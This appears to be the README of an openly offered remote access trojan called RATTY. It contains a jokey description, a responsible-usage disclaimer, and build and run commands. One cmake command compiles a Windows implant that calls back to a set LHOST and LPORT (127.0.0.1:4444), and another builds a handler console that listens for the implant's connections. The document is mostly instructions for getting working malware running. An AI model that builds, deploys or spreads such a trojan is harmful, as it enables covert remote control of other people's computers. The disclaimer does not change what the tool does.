# :rat: RATTY :cheese:
[Remote Access Trojan Thank-You]
## About
The rats are growing hungry in the Winter blizzards and thirsty in the Summar heat-waves. Beware, they just might be in your walls, gathering, foraging, populating... :cheese::rat:

## ⚠️Responsible Usage Notice
This project is intended for educational and authorized security testing purposes only.
Unauthorized use of this program against systems you do not own or have explicit permission
to test is strictly prohibited and may be illegal. Always obtain proper authorization before
running any form of penetration testing or exploitation activity. The creator assumes no
liability for misuse or damage caused by improper or unlawful use of this software.

## Prepare RATTY :rat:
```bash
mkdir build; cd build
mkdir ratty; cd ratty
LHOST=127.0.0.1 LPORT=4444 cmake ../../ && make ratty
```
To activate RATTY, simply execute the exe on a Windows Host via:
```powershell
.\ratty.exe
```

## Prepare RATTY Handler :computer:
```bash
mkdir build; cd build
mkdir ratconsole; cd ratconsole
cmake ../../src/handler && make ratconsole
```
To use the Handler:
```powershell
.\ratconsole.exe -l 127.0.0.1 -p 4444
```